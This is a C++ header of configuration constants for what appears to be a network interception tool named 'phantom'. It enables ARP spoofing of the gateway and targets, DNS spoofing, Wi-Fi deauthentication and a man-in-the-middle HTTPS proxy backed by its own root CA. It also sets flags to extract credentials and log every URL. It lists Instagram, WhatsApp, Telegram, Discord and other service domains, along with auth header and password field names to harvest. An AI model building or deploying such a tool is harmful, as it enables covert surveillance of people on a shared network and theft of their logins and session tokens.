#pragma once
#include <string>
#include <vector>
#include <cstdint>

namespace phantom {

constexpr const char* DEFAULT_INTERFACE   = "";
constexpr uint16_t    PROXY_PORT          = 8080;
constexpr uint16_t    DNS_SPOOF_PORT      = 53;
constexpr int         ARP_SPOOF_INTERVAL  = 5;
constexpr int         ARP_RESTORE_INTERVAL = 30;
constexpr bool        SPOOF_GATEWAY       = true;
constexpr bool        SPOOF_TARGETS       = true;

constexpr const char* CA_CERT_FILE  = "phantom_ca.crt";
constexpr const char* CA_KEY_FILE   = "phantom_ca.key";
constexpr const char* CA_CN         = "PHANTOM Root CA";
constexpr int         CERT_VALIDITY_DAYS = 365;
constexpr int         LEAF_CERT_VALIDITY_DAYS = 90;

constexpr int         MAX_PROXY_CONNECTIONS = 500;
constexpr int         PROXY_RECV_TIMEOUT    = 30;
constexpr size_t      MAX_HEADER_SIZE       = 65536;
constexpr size_t      MAX_BODY_PARSE_SIZE   = 1048576;
constexpr size_t      BUFFER_SIZE           = 65536;

constexpr bool        PARSE_JSON_RESPONSES  = true;
constexpr bool        EXTRACT_CREDENTIALS   = true;
constexpr bool        LOG_ALL_URLS          = true;

constexpr int         DEVICE_IDLE_TIMEOUT   = 300;
constexpr int         SESSION_TIMEOUT       = 1800;

constexpr const char* LOG_DIR              = "phantom_logs";
constexpr const char* DEVICE_LOG_FORMAT    = "device_%s.jsonl";
constexpr const char* ACTIVITY_LOG_FILE    = "activity_feed.jsonl";
constexpr bool        CONSOLE_REALTIME     = true;
constexpr bool        JSON_LOG_ENABLED     = true;

constexpr int         DEAUTH_PACKET_COUNT  = 5;
constexpr int         CHANNEL_HOP_INTERVAL = 300;

inline const std::vector<std::string> INSTAGRAM_DOMAINS = {
    "i.instagram.com", "graph.instagram.com", "www.instagram.com",
    "api.instagram.com", "graphql.instagram.com"
};

inline const std::vector<std::string> YOUTUBE_DOMAINS = {
    "www.youtube.com", "m.youtube.com", "youtubei.googleapis.com",
    "i.ytimg.com", "s.ytimg.com"
};

inline const std::vector<std::string> FACEBOOK_DOMAINS = {
    "www.facebook.com", "m.facebook.com", "web.facebook.com",
    "graph.facebook.com", "api.facebook.com"
};

inline const std::vector<std::string> TWITTER_DOMAINS = {
    "x.com", "api.x.com", "twitter.com", "api.twitter.com",
    "abs.twimg.com", "pbs.twimg.com"
};

inline const std::vector<std::string> TIKTOK_DOMAINS = {
    "www.tiktok.com", "m.tiktok.com", "api.tiktok.com",
    "v16-webapp.tiktok.com", "api22-normal-c.tiktokv.com"
};

inline const std::vector<std::string> WHATSAPP_DOMAINS = {
    "web.whatsapp.com", "whatsapp.com"
};

inline const std::vector<std::string> TELEGRAM_DOMAINS = {
    "web.telegram.org", "telegram.org", "api.telegram.org"
};

inline const std::vector<std::string> DISCORD_DOMAINS = {
    "discord.com", "cdn.discordapp.com", "gateway.discord.gg"
};

inline const std::vector<std::string> REDDIT_DOMAINS = {
    "www.reddit.com", "old.reddit.com", "api.reddit.com",
    "oauth.reddit.com"
};

inline const std::vector<std::string> NETFLIX_DOMAINS = {
    "www.netflix.com", "api.netflix.com", "fast.com"
};

inline const std::vector<std::string> SPOTIFY_DOMAINS = {
    "open.spotify.com", "api.spotify.com", "spclient.wg.spotify.com"
};

inline const std::vector<std::string> AUTH_HEADER_NAMES = {
    "authorization", "x-auth-token", "x-access-token",
    "cookie", "x-csrf-token", "x-instagram-ajax"
};

inline const std::vector<std::string> POST_CREDENTIAL_FIELDS = {
    "username", "email", "password", "passwd", "login",
    "user", "pass", "credential", "token", "secret"
};

} // namespace phantom
